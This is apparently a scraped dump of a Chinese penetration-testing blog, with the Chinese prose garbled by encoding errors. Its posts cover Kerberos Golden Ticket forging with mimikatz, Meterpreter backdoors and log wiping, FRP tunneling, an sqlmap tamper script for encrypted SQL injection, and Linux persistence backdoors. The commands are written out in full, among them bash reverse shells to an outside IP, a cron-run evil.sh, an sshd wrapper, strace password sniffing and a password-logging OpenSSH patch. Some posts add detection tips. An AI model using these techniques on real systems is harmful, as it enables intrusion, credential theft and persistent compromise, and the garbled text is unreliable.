é‡‘ç¥¨åˆ©ç”¨ krbtgtè´¦æˆ·ï¼šæ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½æœ‰ä¸€ä¸ªâ€œkrbtgtâ€çš„ç”¨æˆ·è´¦æˆ·ï¼Œæ˜¯KDCçš„æœåŠ¡è´¦æˆ·ï¼Œç”¨æ¥åˆ›å»ºç¥¨æ®æˆäºˆæœåŠ¡ï¼ˆTGSï¼‰åŠ å¯†çš„å¯†é’¥ã€‚é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰ï¼šä½¿åœ¨æ‹¥æœ‰æ™®é€šåŸŸç”¨æˆ·æƒé™å’Œkrbtgt hashçš„æƒ…å†µä¸‹ï¼Œè·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚ è·å–é‡‘ç¥¨éœ€è¦çš„ntmlå’Œsid 12mimikatz# LsaDump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csvwhoami &#x2F;user 1mimikatz # kerberos::golden &#x2F;user:administrator &#x2F;domain:test.lab &#x2F;sid:S-1-5-21-2952760202-1353902439-2381784089-500 &#x2F;krbtgt:58e91a5ac358d86513ab224312314061 &#x2F;user:god &#x2F;ticket:gold2.kirbi 123kerberos::ptt gold2.kirbi #å¯¼å…¥ç¥¨æ®kerberos::list #åˆ—å‡ºç¥¨æ®kerberos::purge # æ¸…é™¤ç¥¨æ® åé—¨æ¤å…¥ä½¿ç”¨persistenceå¯åŠ¨é¡¹åé—¨åœ¨C:\\Users***\\AppData\\Local\\Temp\\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬åœ¨æ³¨å†Œè¡¨HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ metsvcæœåŠ¡åé—¨ åœ¨C:\\Users***\\AppData\\Local\\Temp\\ä¸Šä¼ äº†ä¸‰ä¸ªæ–‡ä»¶ï¼ˆmetsrv.x86.dllã€metsvc-server.exeã€metsvc.exeï¼‰ï¼Œé€šè¿‡æœåŠ¡å¯åŠ¨ï¼ŒæœåŠ¡åä¸ºmeterpreter 1run metsvc -A è¿æ¥åé—¨ï¼Œset payload windows/metsvc_bind_tcp 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;metsvc_bind_tcpset rhost 192.168.1.133set lport 31337exploit é‡æ–°è¿›å…¥sessionå³å¯ ç—•è¿¹æ¸…ç† meterpreter: clearev https://github.com/3gstudent/Windows-EventLog-Bypass 1PS C:\\&gt; Invoke-Phant0m æ€»ç»“è¿˜éœ€è¦å­¦ä¹ Empireï¼Œåé—¨æ•°æ®ä¼ è¾“çš„åŠ å¯†ï¼Œå…æ€çš„åˆ¶ä½œï¼Œä»¥åŠçœŸå®ç¯å¢ƒä¸­å¦‚ä½•å¿«é€Ÿé«˜æ•ˆçš„åˆ¶å®šè®¡åˆ’ã€‚ å‚è€ƒé“¾æ¥ https://mp.weixin.qq.com/s/nAGjUsre2Hg_IkCPXLxYDQ https://mp.weixin.qq.com/s/QLoXt5JTjHreUkZIg1uW3g","categories":[],"tags":[{"name":"åŸŸæ¸—é€","slug":"åŸŸæ¸—é€","permalink":"https://glotozz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"FRPæ­å»º","slug":"FRPæ­å»º","date":"2020-03-13T04:07:35.000Z","updated":"2020-03-25T08:06:19.254Z","comments":true,"path":"2020/03/13/FRPæ­å»º/","link":"","permalink":"https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• FRP æœåŠ¡ç«¯é…ç½® FRPå®¢æˆ·ç«¯é…ç½® åå¼¹shellæµ‹è¯• å‚è€ƒé“¾æ¥ ä¹‹å‰éƒ½æ˜¯èŠ±ç”Ÿå£³ç®€å•çš„å†…ç½‘ç©¿é€ï¼Œå› ä¸ºæœåŠ¡ç«¯ä¸æ˜¯æˆ‘ä»¬è‡ªå·±çš„ï¼Œå› æ­¤åœ¨ä¸€äº›å®æˆ˜ä¸­æ— æ³•æ»¡è¶³éœ€æ±‚ã€‚ FRP æ˜¯ä¸€ä¸ªä½¿ç”¨ Go è¯­è¨€å¼€å‘çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œå¯ä»¥å¸®åŠ©æ‚¨è½»æ¾åœ°è¿›è¡Œå†…ç½‘ç©¿é€ï¼Œå¯¹å¤–ç½‘æä¾›æœåŠ¡ã€‚FRP æ”¯æŒ TCPã€UDPã€HTTPã€HTTPSç­‰åè®®ç±»å‹ï¼Œå¹¶ä¸”æ”¯æŒ Web æœåŠ¡æ ¹æ®åŸŸåè¿›è¡Œè·¯ç”±è½¬å‘ã€‚ è¯ä¸å¤šè¯´ï¼Œå¼€å§‹é…ç½® é¡¹ç›®åœ°å€ï¼šhttps://github.com/fatedier/frp é¦–å…ˆï¼Œç½‘ç»œæ‹“æ‰‘å›¾ FRP æœåŠ¡ç«¯é…ç½®é…ç½® FRP æœåŠ¡ç«¯çš„å‰ææ¡ä»¶æ˜¯éœ€è¦ä¸€å°å…·æœ‰å…¬ç½‘ IPçš„è®¾å¤‡ frps.ini 12[common]server_port &#x3D; 7000 ./frps -c ./frps.iniç›‘å¬ä¸€ä¸ª7000ç«¯å£çš„FRPæœåŠ¡ç«¯ FRPå®¢æˆ·ç«¯é…ç½®frpc.ini 123456789[common]server_addr &#x3D; 118.178.88.46server_port &#x3D; 7000[kali]type &#x3D; tcplocal_ip &#x3D; 192.168.56.124local_port &#x3D; 4444remote_port &#x3D; 1234 ./frpc -c ./frpc.ini è¿™æ ·å°±å¯ä»¥æˆåŠŸåœ¨ FRP æœåŠ¡ç«¯ä¸ŠæˆåŠŸå»ºç«‹ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼ŒæœåŠ¡ç«¯çš„1234ç«¯å£æ˜ å°„ç€æœ¬åœ°è™šæ‹Ÿæœºçš„4444ç«¯å£ åå¼¹shellæµ‹è¯•1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234 0&gt;&amp;1 çœŸæ­£çš„1åˆ†é’Ÿæå®šå†…ç½‘ç©¿é€ï¼ï¼ å½“ç„¶ï¼Œå¦‚æœè¦å¼€å¯ä¸€äº›æœåŠ¡ï¼Œéœ€è¦æ›´åŠ å®‰å…¨çš„é…ç½®ï¼Œå…·ä½“å¯å‚è€ƒgithubå®˜ç½‘ã€‚ å‚è€ƒé“¾æ¥ https://www.dazhuanlan.com/2019/08/18/5d595a72cb5d4/","categories":[],"tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"SQLMAP-temperç¼–å†™","slug":"SQLMAP-temperç¼–å†™","date":"2020-03-12T16:58:06.000Z","updated":"2020-03-25T08:05:23.409Z","comments":true,"path":"2020/03/13/SQLMAP-temperç¼–å†™/","link":"","permalink":"https://glotozz.github.io/2020/03/13/SQLMAP-temper%E7%BC%96%E5%86%99/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• åå°è„šæœ¬ tamperç¼–å†™ å‚è€ƒé“¾æ¥ ä¸€èˆ¬æƒ…å†µä¸‹sqlmapæ¯”è‡ªå·±å†™è„šæœ¬æ–¹ä¾¿ï¼Œåªéœ€è¦å¤„ç†å¥½temperè„šæœ¬ï¼Œå¹¶ä¸”sqlmapèƒ½é’ˆå¯¹ä¸åŒçš„æ•°æ®åº“ï¼Œè¿™ç‚¹å¾ˆé‡è¦ã€‚ æ­£å¥½ä¹‹å‰çœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œè‡ªå·±ä¹Ÿå­¦ä¹ ä¸‹ï¼Œä¹‹åå¤šç”¨ç”¨sqlmapã€‚ åå°è„šæœ¬æ¯”å¦‚æœ‰è¿™ä¹ˆä¸€ä¸ªåå°å¤„ç†çš„è„šæœ¬ 1234567891011121314151617181920&lt;?phpheader('content-type:text/html;charset=utf-8');//è§£å¯†è¿‡ç¨‹function decode($data)&#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,''); mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021'); $data = mdecrypt_generic($td,base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if(substr(trim($data),-6)!=='_mozhe')&#123; echo '&lt;script&gt;window.location.href=\"/index.php\";&lt;/script&gt;'; &#125;else&#123; return substr(trim($data),0,strlen(trim($data))-6); &#125;&#125;$id=decode($_GET['id']);$sql=\"select id,title,content,time from notice where id=$id\";$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt; è¿™é‡Œå¯¹ä¼ å…¥çš„idè¿›è¡ŒAES-128-CCBè§£å¯†ä¹‹åç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥æŸ¥è¯¢ï¼Œä¹‹åæˆ‘æŸ¥äº†è¿™ä¸ªmcrypt_module_openï¼Œæ˜¯ä¸ªæ‰©å±•ï¼Œä½†æ˜¯php7.1å·²ç»è¢«åºŸå¼ƒï¼Œäºæ˜¯æ”¹ç”¨openssl_encrypt() 12345678910111213141516171819202122232425&lt;?phpheader('content-type:text/html;charset=utf-8');//è§£å¯†è¿‡ç¨‹$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt åŠ å¯†ä¸åŒMcryptï¼Œå¯¹ç§˜é’¥é•¿åº¦è¦æ±‚ï¼Œè¶…å‡º16åŠ å¯†ç»“æœä¸å˜ $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;$id = AES::decrypt($_GET['id'],$key);$sql = \"select * from th_user where uid=$id\";$info = $link-&gt;query($sql);$arr = $info-&gt;fetch_assoc();?&gt; tamperç¼–å†™sqlmapæ˜¯ä¸ä¼šå¤„ç†è¿™ç§åŠ å¯†çš„ï¼Œå› æ­¤éœ€è¦ç¼–å†™ä¸€ä¸ªtamperè„šæœ¬ æµ‹è¯•äº†ä¸€ä¸‹ï¼Œphpä½¿ç”¨openssl_encrypt()å’Œpythonä½¿ç”¨pycryptoæ¨¡å—åŒæ—¶é€‰æ‹©AES-128-CBCåŠ å¯†ç»“æœä¸åŒï¼Œæˆ‘çš„æ€è·¯æ˜¯ç³»ç»Ÿè°ƒç”¨ä¸€ä¸‹php å…ˆå‡†å¤‡ä¸€ä¸ªè¢«ç³»ç»Ÿçš„è°ƒç”¨2.php 123456789101112131415161718&lt;?php$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt åŠ å¯†ä¸åŒMcryptï¼Œå¯¹ç§˜é’¥é•¿åº¦è¦æ±‚ï¼Œè¶…å‡º16åŠ å¯†ç»“æœä¸å˜ $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;echo AES::encrypt(base64_decode($argv[1]),$key);?&gt; tamperè„šæœ¬aes.py 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission\"\"\"import base64import osfrom Crypto.Cipher import AESfrom lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWESTdef dependencies(): passdef encrypt(text): t = base64.b64encode(text) # print t x = os.popen('php 2.php ' + t).readlines() return x[0]# print encrypt('-1 union select 1,2,3,4')def tamper(payload, **kwargs): return encrypt(payload) æ³¨æ„ï¼Œæµ‹è¯•çš„æ—¶å€™å°†2.phpæ”¾åœ¨/tamperç›®å½•ä¸‹ï¼Œè·‘sqlmapçš„æ—¶å€™éœ€è¦æ”¾åœ¨/sqlmap-masterä¸‹ 1python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?id&#x3D;1 --tamper aes.py --current-db å‚è€ƒé“¾æ¥ https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html","categories":[],"tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Linuxä¸‹å¸¸è§ç»´æƒæ–¹å¼","slug":"Linuxä¸‹å¸¸è§ç»´æƒæ–¹å¼","date":"2020-03-12T01:29:56.000Z","updated":"2020-04-18T01:08:31.890Z","comments":true,"path":"2020/03/12/Linuxä¸‹å¸¸è§ç»´æƒæ–¹å¼/","link":"","permalink":"https://glotozz.github.io/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• 1ã€ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç  2ã€SUID Shell 3ã€sshå…¬ç§é’¥å…å¯†ç™»å½• 4ã€è½¯è¿æ¥ 5ã€SSH wrapper 6ã€straceåé—¨ 7ã€crontabåå¼¹shell 8ã€opensshåé—¨ 9ã€PAMåé—¨ 10ã€rookitåé—¨ å‚è€ƒé“¾æ¥ çœ‹äº†ç¯‡æ–‡ç« è§‰å¾—è¿˜ä¸é”™ã€‚æœ¬ç€å®è·µå‡ºçœŸçŸ¥çš„ç²¾ç¥ï¼Œè‡ªå·±åŠ¨æ‰‹æ“ä½œä¸‹ 1ã€ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç æ·»åŠ æ™®é€šç”¨æˆ· 123456789101112# åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest# useradd -p æ–¹æ³• &#96; &#96; æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,&quot;$()&quot;ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥useradd -p &quot;$(openssl passwd -1 123456)&quot; guest# chpasswdæ–¹æ³•useradd guest;echo &#39;guest:123456&#39;|chpasswd# echo -eæ–¹æ³•ï¼Œ-eï¼šæ¿€æ´»è½¬ä¹‰å­—ç¬¦ã€‚# ä½¿ç”¨-eé€‰é¡¹æ—¶ï¼Œè‹¥å­—ç¬¦ä¸²ä¸­å‡ºç°ä»¥ä¸‹å­—ç¬¦ï¼Œåˆ™ç‰¹åˆ«åŠ ä»¥å¤„ç†ï¼Œè€Œä¸ä¼šå°†å®ƒå½“æˆä¸€èˆ¬æ–‡å­—è¾“å‡ºuseradd test;echo -e &quot;123456\\n123456\\n&quot; |passwd test æ·»åŠ rootç”¨æˆ· 12# åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test æœ‰äº›æœåŠ¡å™¨å¯èƒ½æœ‰å¯†ç ç­–ç•¥ï¼Œéœ€è¦å°†å¯†ç è®¾ç½®çš„å¤æ‚äº› è¿™æ—¶å€™çœ‹ä¸€ä¸‹/etc/passwd æ˜æ˜¾guest2æ˜¯rootæƒé™ å¯ç–‘ç”¨æˆ·æ’æŸ¥ awkå‘½ä»¤è¯­æ³•ï¼š awkå·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼šè¯»å…¥æœ‰â€™\\nâ€™æ¢è¡Œç¬¦åˆ†å‰²çš„ä¸€æ¡è®°å½•ï¼Œç„¶åå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚é»˜è®¤åŸŸåˆ†éš”ç¬¦æ˜¯â€ç©ºç™½é”®â€ æˆ– â€œ[tab]é”®â€ -FæŒ‡å®šåˆ†éš”ç¬¦ 123456# æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd# æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯awk &#39;&#x2F;\\$1|\\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow# é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot; å¯ç–‘ç”¨æˆ·åˆ é™¤ userdel guest1 2ã€SUID Shell Suid shellæ˜¯ä¸€ç§å¯ç”¨äºä»¥æ‹¥æœ‰è€…æƒé™è¿è¡Œçš„shellã€‚ 123# é…åˆæ™®é€šç”¨æˆ·æƒé™ä½¿ç”¨cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shellchmod u+s &#x2F;tmp&#x2F;shell å¤‡æ³¨ï¼šbash2é’ˆå¯¹suidåšäº†ä¸€äº›é˜²æŠ¤æªæ–½ï¼Œéœ€è¦ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shellã€‚å¦å¤–ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„ã€‚ æ’æŸ¥æŠ€å·§ 123456# åœ¨Linuxä¸­æŸ¥æ‰¾SUIDè®¾ç½®çš„æ–‡ä»¶find . -perm &#x2F;4000# åœ¨Linuxä¸­æŸ¥æ‰¾ä½¿ç”¨SGIDè®¾ç½®çš„æ–‡ä»¶find . -perm &#x2F;2000# å–æ¶ˆsæƒé™chmod u-s &#x2F;tmp&#x2F;shell 3ã€sshå…¬ç§é’¥å…å¯†ç™»å½•å†™å…¥å…¬é’¥ 1234567#å°†è‡ªå·±ä¸»æœºçš„home&#x2F;xxx&#x2F;.ssh&#x2F;id_rsa.pubå†™å…¥é¶æœº&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;authorized_keysssh ford@192.168.56.102ssh-keygenls -la &#x2F;home&#x2F;pinak&#x2F;.sshcat &#x2F;home&#x2F;pinak&#x2F;.ssh&#x2F;id_rsa.pub &gt; &#x2F;home&#x2F;pinak&#x2F;authorized_keyssudo -u sarang cp &#x2F;home&#x2F;pinak&#x2F;authorized_keys &#x2F;home&#x2F;sarang&#x2F;.ssh&#x2F; æ’æŸ¥æŠ€å·§ 1æŸ¥çœ‹&#x2F;root&#x2F;.ssh&#x2F;authorized_keysæ˜¯å¦è¢«ä¿®æ”¹ã€‚ ä½¿ç”¨ç§é’¥ 12#æ ¹æ®&#x2F;etc&#x2F;passwdç¡®å®šç”¨æˆ·fordåï¼Œè¯»å–ç§é’¥&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsaï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œæ³¨æ„å°†id_rsaè®¾ç½®ä¸º700ssh ford@192.168.56.102 -p 6688 -i id_rsa ä»…é ä¸€ä¸ªç§é’¥å¹¶ä¸èƒ½ç›´æ¥ç™»å½•ï¼Œä½†æ˜¯å½“æ—¶åšCynixé¶æœºçš„ç¡®åªè¯»å–äº†ç§é’¥å³å¯æˆåŠŸç™»å½•ã€‚æŸ¥çœ‹äº†ä¸‹å‘ç°é…ç½®PasswordAuthentication noå³ç¦ç”¨å¯†ç ç™»å½•ï¼Œæœ€åå‘ç°.sshç›®å½•ä¸‹authorized_keyså¡«å†™äº†é¶æœºè‡ªèº«çš„å…¬é’¥ã€‚åŸç†å’Œä¸Šé¢çš„å†™å…¥å…¬é’¥ç›¸åŒï¼Œåªæ˜¯å¤šäº†ä¸€ç§æ€è·¯ã€‚ä½†æ˜¯æˆ‘ä¹‹åæµ‹è¯•å‘ç°è¿˜æ˜¯å¤±è´¥ï¼Œåº”è¯¥è¿˜éœ€è¦ä¿®æ”¹ä»€ä¹ˆé…ç½®ã€‚ 4ã€è½¯è¿æ¥ åœ¨sshdæœåŠ¡é…ç½®è¿è¡ŒPAMè®¤è¯çš„å‰æä¸‹ï¼ŒPAMé…ç½®æ–‡ä»¶ä¸­æ§åˆ¶æ ‡å¿—ä¸ºsufficientæ—¶åªè¦pam_rootokæ¨¡å—æ£€æµ‹uidä¸º0å³rootæƒé™å³å¯æˆåŠŸè®¤è¯ç™»é™†ã€‚é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼ï¼Œå®è´¨ä¸ŠPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å /tmp/su åœ¨/etc/pam.d/ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚: /etc/pam.d/su)ï¼Œä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯auth sufficient pam_rootok.soï¼Œæ‰€ä»¥åªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯SSHä»»æ„å¯†ç ç™»é™†ï¼Œé™¤äº†suä¸­ä¹‹å¤–è¿˜æœ‰chshã€chfnåŒæ ·å¯ä»¥ã€‚ 12#åˆ›å»ºè½¯è¿æ¥ï¼Œå¹¶å¼€å¯6688ç«¯å£ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;6688 æ’æŸ¥æŠ€å·§ è¿›ç¨‹ã€ç«¯å£éƒ½å¯ä»¥å‘ç°å¼‚å¸¸ï¼Œ kill -s 9 PID ç»“æŸè¿›ç¨‹å³å¯æ¸…é™¤åé—¨ã€‚ 5ã€SSH wrapper inité¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨/usr/bin/sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshellã€‚ æœåŠ¡ç«¯ 12345678cd &#x2F;usr&#x2F;sbin&#x2F;mv sshd ..&#x2F;bin&#x2F;echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd#ubuntu&#x2F;etc&#x2F;init.d&#x2F;sshd restart å®¢æˆ·ç«¯ 1socat STDIO TCP4:118.178.88.46:22,sourceport&#x3D;13377 æ²¡æˆåŠŸã€‚åº”è¯¥æ˜¯æœåŠ¡ç«¯ç³»ç»Ÿçš„åŸå› ï¼Œä¸Šé¢çš„éœ€è¦åœ¨ubuntuä¸‹ï¼Œæˆ‘çš„æœåŠ¡ç«¯æ˜¯centos æ’æŸ¥æŠ€å·§ 123ls -al &#x2F;usr&#x2F;sbin&#x2F;sshdcat &#x2F;usr&#x2F;sbin&#x2F;sshd# å¯é€šè¿‡é‡è£…sshæœåŠ¡æ¢å¤ã€‚ 6ã€straceåé—¨æ‰¾åˆ°è¿›ç¨‹PID 12ps -ef | grep sshd #çˆ¶è¿›ç¨‹PIDstrace -f -p 2908 -o &#x2F;tmp&#x2F;.ssh.log -e trace&#x3D;read,write -s 2048 é€šè¿‡é…ç½®ç”¨æˆ·ç›®å½•ä¸‹.loginé…ç½®è·å–sshæ˜æ–‡å¯†ç  1234#vim &#x2F;etc&#x2F;bashrcalias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;#source &#x2F;root&#x2F;.bashrc#suï¼ŒsudoåŒæ ·çš„é“ç† é‚£ä¹ˆåªè¦ç›®æ ‡ä½¿ç”¨sshï¼Œä¾¿ä¼šåœ¨/tmpç›®å½•ä¸‹ç”Ÿæˆè®°å½• æ’æŸ¥æŠ€å·§ ä½¿ç”¨aliaså³å¯å‘ç°å¼‚å¸¸ã€‚ 7ã€crontabåå¼¹shellcrontabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚æ–°å»ºshellè„šæœ¬ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹ã€‚ /etc/evil.sh 12#!&#x2F;bin&#x2F;bashbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234 0&gt;&amp;1 1chmod +sx &#x2F;etc&#x2F;evil.sh /etc/crontab 12#æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh é‡å¯ 1234#ubuntuservice cron start#centosservice crond restart æ’æŸ¥æŠ€å·§ 123# æŸ¥çœ‹å¯ç–‘çš„å®šæ—¶ä»»åŠ¡åˆ—è¡¨cat &#x2F;etc&#x2F;crontabcrontab -e 8ã€opensshåé—¨ åˆ©ç”¨opensshåé—¨ï¼Œè®¾ç½®SSHåé—¨å¯†ç åŠrootå¯†ç è®°å½•ä½ç½®ï¼Œéšè”½æ€§è¾ƒå¼ºï¼Œä¸æ˜“è¢«å‘ç°ã€‚ 123#æŸ¥çœ‹sshdç³»ç»Ÿç‰ˆæœ¬ï¼Œä¹‹åéœ€è¦ä¿®æ”¹ssh -VOpenSSH_6.6.1p1, OpenSSL 1.0.1e-fips 11 Feb 2013 1234567891011121314151617181920212223242526272829303132333435363738aã€å¤‡ä»½SSHé…ç½®æ–‡ä»¶mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.oldmv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.oldbã€è§£å‹å¹¶å®‰è£…è¡¥ä¸tar -zxvf openssh-5.9p1.tar.gztar -zxvf 0x06-openssh-5.9p1.patch.tar.gzcp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff openssh-5.9p1&#x2F;cd openssh-5.9p1patch &lt; sshbd5.9p1.diffcã€è®°å½•ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶ä½ç½®åŠå…¶å¯†ç vi includes.h #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot; &#x2F;&#x2F;è®°å½•ç™»å½•æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç  #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot; &#x2F;&#x2F;è®°å½•æœ¬æœºç™»å½•è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç  #define SECRETPW &quot;123456789&quot; &#x2F;&#x2F;åé—¨çš„å¯†ç dã€ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯vi version.h #define SSH_VERSION &quot;å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬&quot; #define SSH_PORTABLE &quot;å°ç‰ˆæœ¬å·&quot;eã€å®‰è£…å¹¶ç¼–è¯‘.&#x2F;configure 